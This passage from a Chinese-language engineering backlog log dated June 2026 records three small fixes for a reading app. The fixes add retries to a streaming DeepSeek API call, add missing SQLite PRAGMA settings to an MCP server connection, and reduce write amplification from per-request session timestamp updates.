**northstar:** 中——Theme 2「回顾有价值」以聊天历史为核心数据；import 路径的静默覆盖与 OPT-063（compress 路径丢失）构成同类「历史数据丢失」风险；本项填补数据安全护栏的最后一个口。

---

## 2026-06-23

### E109 — `call_deepseek_stream()` 无重试逻辑：主聊天路径遇瞬断即崩 (S)

**What:** `call_deepseek()` 有完整重试机制（`app_server.py:3178-3219`），但 `call_deepseek_stream()`（`app_server.py:3222-3265`）完全没有：

```python
# app_server.py:3178-3179 — 重试常量
DEEPSEEK_MAX_ATTEMPTS = 3
DEEPSEEK_RETRYABLE_CODES = {429, 500, 502, 503}

# app_server.py:3188 — call_deepseek() 有重试循环
for attempt in range(DEEPSEEK_MAX_ATTEMPTS):
    ...

# app_server.py:3261-3265 — call_deepseek_stream() 直接抛出，无任何重试
except HTTPError as error:
    payload = error.read().decode("utf-8", errors="ignore")
    raise RuntimeError(payload or f"HTTP {error.code}") from error
except URLError as error:
    raise RuntimeError(str(error.reason)) from error
```

用户在聊天面板触发的 LLM 请求走的是 streaming 路径（`app_server.py:4834`: `stream = call_deepseek_stream(request_messages)`）。任何一次 429/502/503/超时都立刻报错，而非像非 streaming 路径那样静默重试 3 次。现有测试 `tests/agent/deepseek_retry_test.py` 全部针对 `call_deepseek()`，streaming 路径零测试覆盖。

**Why:** 主聊天（explore/深度探讨）是 Theme 2「回顾有价值」的核心 UX；DeepSeek 429（rate limit）和 502/503（短暂不可用）在夜间/高峰期均属正常瞬断。streaming 路径无重试 = 用户看到错误弹框，而同等请求走非 streaming 路径早就静默恢复。实现对称重试技术上不复杂：streaming 的重试只需在 `urlopen()` 这一步循环，整个连接建立放入重试循环即可（不需要对 chunk 逐级重试）。

**Complexity:** S — 在 `call_deepseek_stream()` 的 `urlopen()` 调用外套 `for attempt in range(DEEPSEEK_MAX_ATTEMPTS):` 循环，异常处理逻辑镜像 `call_deepseek()` 的现有模式（retryable codes + exponential backoff via `time.sleep`）。同时补一个 `tests/agent/deepseek_retry_test.py` 中的 streaming 测试 class。

**Files:** `app_server.py:3222-3265`（`call_deepseek_stream`）；`tests/agent/deepseek_retry_test.py`（新增 streaming 测试）

**northstar:** 强——主聊天（Theme 2 核心入口）遇瞬断即崩是对用户信任的直接伤害；修复使 streaming 路径与非 streaming 路径同等可靠，S 改动消除两路径的一致性缺口。

---

### E110 — MCP `_get_conn()` 缺少三项 PRAGMA 优化：写路径 SQLite 性能与 app_server 不对称 (S)

**What:** `app_server.py:339-344` 的 `get_conn()` 设置了四项 PRAGMA，而 `reading_mcp_server.py:43-47` 的 `_get_conn()` 只设置了 `busy_timeout`，缺少另外三项：

```python
# reading_mcp_server.py:43-47 — 仅有 busy_timeout
def _get_conn() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=10)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA busy_timeout = 5000")
    return conn

# app_server.py:339-344 — 完整四项 PRAGMA
conn.execute("PRAGMA busy_timeout = 5000")
conn.execute("PRAGMA synchronous = NORMAL")
conn.execute("PRAGMA cache_size = -20000")  # 20 MB page cache
conn.execute("PRAGMA temp_store = MEMORY")
```

缺少的三项：`synchronous=NORMAL`（将 WAL 模式下 fsync 次数从 FULL 降至 1/3）、`cache_size=-20000`（20 MB 页缓存，避免 MCP 写操作频繁触发磁盘 I/O）、`temp_store=MEMORY`（临时表/排序保持在内存，避免磁盘临时文件）。

**Why:** MCP server 是 Claude Desktop 的写路径；批量 `add_note` / `add_book` 调用会产生多次短事务。缺少这三项在 WAL 模式下意味着每次提交都触发完整 fsync（synchronous=FULL 是 SQLite 默认值），同时无页缓存加速。修复为 3 行追加，无任何 schema/API 变更。

**Complexity:** S — 在 `reading_mcp_server.py:_get_conn()` 中 `busy_timeout` 那行之后追加三行 `conn.execute()` 即可，无其他改动。

**Files:** `reading_mcp_server.py:43-47`（`_get_conn` 函数）

**northstar:** 弱——MCP 当前使用频率不高；修复是纯技术对称性修复，无直接用户可感知 impact；但低成本，有益无害，是 MCP 写路径可靠性的基础设施保障。

---

### E111 — `resolve_user_from_token()` 每次认证请求都无条件 UPDATE `last_seen_at`：高频写放大 (S)

**What:** `app_server.py:1452-1475` 的 `resolve_user_from_token()` 在每次认证请求末尾无条件执行 UPDATE：

```python
# app_server.py:1473
self.db.execute(
    "UPDATE sessions SET last_seen_at = ? WHERE token = ?",
    (now_iso(), token),
)
```

这是一条写事务，触发于每次 HTTP 请求的认证阶段——包括 GET /api/state、SSE 轮询等只读请求。在 WAL 模式下每个 UPDATE 都产生一个独立写事务和对应的 WAL 记录。

**Why:** 若 `last_seen_at` 精度需求为分钟级（会话管理/过期判断均以小时/天为粒度），可改为「上次记录时间距 now > 5 分钟才 UPDATE」，消除每个只读请求都带写事务的模式。这与 OPT-026（`quote_images` 频繁落盘）同属「读放写」类问题。注意：此项在 explore.md E23（2026-06-02）中已有记录，此处重提是因为它尚未进入 backlog。

**Complexity:** S — 在 UPDATE 之前加一个时间差判断（取当前 `last_seen_at` 与 now 比较，差 > 5min 才执行）；或在认证缓存层记录上次写入时间。需注意并发正确性（两个并发请求可能同时判断为「需要 UPDATE」，是可接受的良性竞态）。

**Files:** `app_server.py:1452-1475`（`resolve_user_from_token`）

**northstar:** 弱——用户可感知 impact 为零；属于后端性能卫生修复；当前使用规模下收益极小，仅作记录，不建议优先执行。

---
